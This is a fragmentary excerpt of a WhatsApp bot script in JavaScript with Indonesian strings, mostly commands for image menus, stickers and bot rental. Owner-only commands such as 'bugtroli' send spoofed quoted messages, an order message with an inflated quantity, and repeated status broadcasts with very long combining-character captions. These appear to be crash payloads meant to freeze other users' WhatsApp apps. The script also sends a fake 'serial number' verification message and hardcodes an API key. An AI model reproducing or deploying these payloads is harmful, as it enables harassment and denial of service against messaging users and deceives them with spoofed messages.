...
const fakestatus = (teks) => {
        ...
        const fakeyt = (teks) => {
          ...
          "thumbnail": fs.readFileSync('media/image/fake.jpeg'),
          "sourceUrl": "",
          },mentionedJid:[sender]}, quoted : wan})
          };
...
if (!isGroup && isCmd && !wan.key.fromMe){
	tek = `Invi Botz Command`
teks = `Maaf @${senderr.split('@')[0]}, command ${prefix + command} tidak ada dalam menu`
sendButMessage (from, teks, tek, nomenu, 'extendedTextMessage', {sendEphemeral:true, quoted:wan, mentionedJid:[senderr]})
}


if (!wan.key.fromMe && !isOwner && banChats === false) return
...
case 'cecanvietnam':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
  author = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/vietnam?apikey=ZeroYT7`)
  buff = await getBuffer(author.result.url)
  buttons = [{buttonId: noprefix ? "cecanvietnam" : "!"+"cecanvietnam", buttonText:{displayText: `NEXT`},type:1}]
  imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'𝘾𝙧𝙚𝙖𝙩𝙚𝙙 Wann', imageMessage: imageMsg,
...
case 'cecanmalaysia':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
  author = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/malaysia?apikey=ZeroYT7`)
  buff = await getBuffer(author.result.url)
  buttons = [{buttonId: noprefix ? "cecanmalaysia" : "!"+"cecanmalaysia", buttonText:{displayText: `NEXT`},type:1}]
  imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'𝘾𝙧𝙚𝙖𝙩𝙚𝙙 Wann', imageMessage: imageMsg,
  contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
  prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
...
case 'cecankorea':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
  author = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/korea?apikey=ZeroYT7`)
  buff = await getBuffer(author.result.url)
  buttons = [{buttonId: noprefix ? "cecankorea" : "!"+"cecankorea", buttonText:{displayText: `NEXT`},type:1}]
  imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'𝘾𝙧𝙚𝙖𝙩𝙚𝙙 Wann', imageMessage: imageMsg,
  contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
  prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
...
case 'cecanindonesia':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
  author = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/indonesia?apikey=ZeroYT7`)
  buff = await getBuffer(author.result.url)
  buttons = [{buttonId: noprefix ? "cecanindonesia" : "!"+"cecanindonesia", buttonText:{displayText: `NEXT`},type:1}]
  imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'𝘾𝙧𝙚𝙖𝙩𝙚𝙙 Wann', imageMessage: imageMsg,
  contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
  prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
...
case 'cecanjapan':
    if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
    author = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/japan?apikey=ZeroYT7`)
    buff = await getBuffer(author.result.url)
    buttons = [{buttonId: noprefix ? "cecanjapan" : "!"+"cecanjapan", buttonText:{displayText: `NEXT`},type:1}]
    imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
    buttonsMessage = {footerText:'𝘾𝙧𝙚𝙖𝙩𝙚𝙙 Wann', imageMessage: imageMsg,
    contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
    prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
...
case 'cecanthailand':
    if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
    author = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/thailand?apikey=ZeroYT7`)
    buff = await getBuffer(author.result.url)
    buttons = [{buttonId: noprefix ? "cecanthailand" : "!"+"cecanthailand", buttonText:{displayText: `NEXT`},type:1}]
    imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
    buttonsMessage = {footerText:'𝘾𝙧𝙚𝙖𝙩𝙚𝙙 Wann', imageMessage: imageMsg,
    contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
    prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
...
case 'cecanchina':
    if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
    author = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/china?apikey=ZeroYT7`)
    buff = await getBuffer(author.result.url)
    buttons = [{buttonId: noprefix ? "cecanchina" : "!"+"cecanchina", buttonText:{displayText: `NEXT`},type:1}]
    imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
    buttonsMessage = {footerText:'𝘾𝙧𝙚𝙖𝙩𝙚𝙙 Wann', imageMessage: imageMsg,
    contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
    prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
...
case 'gacha':
  list = []
  listmenu = [`cecanvietnam`,`cecanmalaysia`,`cecankorea`,`cecanindonesia`,`cecanjapan`,`cecanthailand`,`cecanchina`]
  listmenuu = [`• Cecan Vietnam`,`• Cecan Malaysia`,`• Cecan Korea`,`• Cecan Indonesia`,`• Cecan Japan`,`• Cecan Thailand`,`• Cecan China`]
  nombor = 1
  startnum = 0
  for (let x of listmenu) {
  const yy = {title: 'Gacha Cewe' + nombor++,
       rows: [
          {
           title: `${listmenuu[startnum++]}`,
           description: ``,
  ...
  break
				...
				case 'identitaspalsu':
				case 'fake':
				if (!isRegistered && !wan.key.fromMe) return cheat(mess.only.Registered)
				...
				todcul = []
				for (let o of wan)
		wann.groupCreate(namagc, wan.participant)
break
				 case 'telestick':
                    ini_url = args[0]
                    ...
                    for (sticker_ in ini_sticker) {
                        ...
                        wann.sendMessage(from, buffer, sticker, {quoted: ben})
                    }
                    break
					case 'wpmuslim':
	...
	anu = ono[Math.floor(Math.random() * ono.length)]
										...
										wann.sendMessage(from, buffer, image, {quoted: ben, caption: 'Neh..'})
										break
case 'bc3':
      case 'bcbutton':
...
You can see other menus for yourself by typing !command`
 ...
 case 'menu':
    ...
    thu = await wann.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
               const boy = "6285640068416@s.whatsapp.net"     
               ...
               timestampe = speed();
               latensie = speed() - timestampe             
               menu =`JANGN SPAM YAH KAK`                        
               buttons = [{buttonId: `${prefix}command`,buttonText:{displayText: '☣️𝘾𝙊𝙈𝙈𝘼𝙉𝘿'},type:1},{buttonId:`${prefix}botanon`,buttonText:{displayText:'💮RULES'},type:1},{buttonId: `${prefix}sewabot`,buttonText:{displayText: '🟨𝙎𝙀𝙒𝘼𝘽𝙊𝙏'},type:1},{buttonId:`${prefix}allmenu`,buttonText:{displayText:'ALLMENU'},type:1}]
              imageMsg = (await wann.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/Menu.jpg`)})).imageMessage
...
Flw: instagram.com/achyrr_wann/ `, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}
            
               prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: wan, contextInfo:{ mentionedJid: parseMention(menu), externalAdReply: {
							title: `Hai ${pushname} 👋`,
							body: `${date}`,
							previewType: 1,
							thumbnailUrl: "https://youtu.be/zgSfpOOuI6Q",
							thumbnail: fs.readFileSync('./media/virgam.jpeg'), }, forwardingScore:508, isForwarded:true, mentionedJid:[sender]}})
                            wann.relayWAMessage(prep)
                            break
case 'allmenu':
...
wann.sendMessage(from, { contentText: `${menu}`, footerText: `🐣 Day : ${week} ${weton}\n🐥 Date : ${date}`,buttons: [{ buttonId: noprefix ? "sewabot" : "!"+"sewabot", buttonText: { displayText: '🏷️ RENT A BOT' }, type: 1 },{ buttonId: noprefix ? "owne" : "!"+"owner", buttonText: { displayText: 'OWNER BOT' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
...
wann.sendMessage(`@s.whatsapp.net`, `8473 Itu NOMOR SERIAL ANDA UNTUK VERIFY REPLY CHAT INI DAN KETIK KODE SERIAL MU`, text, {quoted: freply})
...
wann.sendMessage(from, options, text,{ quoted: {
				  ...
				  message: {
				   orderMessage: {
				    ...
				    surface: 1,
				    message: '999999999',
				    orderTitle: 'X ChillDs KuNz', // Idk what this does
...
case 'bugtroli':
if (!isOwner) return  reply(mess.only.owner)
  wann.sendMessage(from,fake,text,{ 
                 quoted: {
                key: {
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                },sendEphemeral: true,
...
if (!isOwner) return  reply(mess.only.owner)
 nicko3 = fs.readFileSync(`./temp/stick/tsukasa.webp`)
				wann.sendMessage(from, nicko3,sticker,{ quoted: {
  key: {
...
if (!isOwner) return  reply(mess.only.owner)
 ...
 wann.sendMessage('status@broadcast', cih, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁' ,thumbnail: virgam})
 wann.sendMessage('status@broadcast', cih, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆??𐨆𐨆𐨆𐨆𐨆𐨠 ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁' ,thumbnail: virgam})
 wann.sendMessage('status@broadcast', cih, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁' ,thumbnail: virgam})
 wann.sendMessage('status@broadcast', cih, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁' ,thumbnail: virgam})
 wann.sendMessage('status@broadcast', cih, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁' ,thumbnail: virgam})
 wann.sendMessage('status@broadcast', cih, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁' ,thumbnail: virgam})
...
"buttonText": "ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️",
...
fakeyt(`SC? NI ADA YANG ENC WKWK`)
